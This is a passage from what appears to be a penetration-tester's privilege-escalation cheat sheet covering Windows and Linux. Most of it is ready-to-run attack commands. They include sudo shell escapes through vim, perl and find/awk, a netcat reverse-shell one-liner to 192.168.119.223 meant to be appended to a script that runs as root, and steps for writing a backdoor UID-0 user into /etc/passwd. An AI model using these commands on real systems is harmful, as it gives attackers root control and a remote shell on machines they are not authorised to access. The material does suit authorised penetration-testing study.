If SeImpersonatePrivilege is available, use Juicy Potato.

* To change integrity level to high even as admin:	``` powershell.exe Start-Process cmd.exe -Verb runAs ```


### Linux Privilege Escalation
* Use id command to see if you're in the sudo group.
* If in sudo group, find what sudo can do:		sudo -l
	* If different shells are available, run those as root
	* If VIM is available, enter vim and type :!bash to exit into root shells
	* If perl is available, type perl -e 'exec "/bin/bash";'
	* If find is available, type find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}'\;

#### One liner to add to writeable scripts running as root:	
``` echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 192.168.119.223 4242 >/tmp/f" >> user_backups.sh ```

#### If Linux /etc/passwd is writeable, follow these steps:
1. Create password hash: ```openssl passwd evil```
2. Append proper syntax using new hash: ```echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd```
3. Switch users: ```su root2```


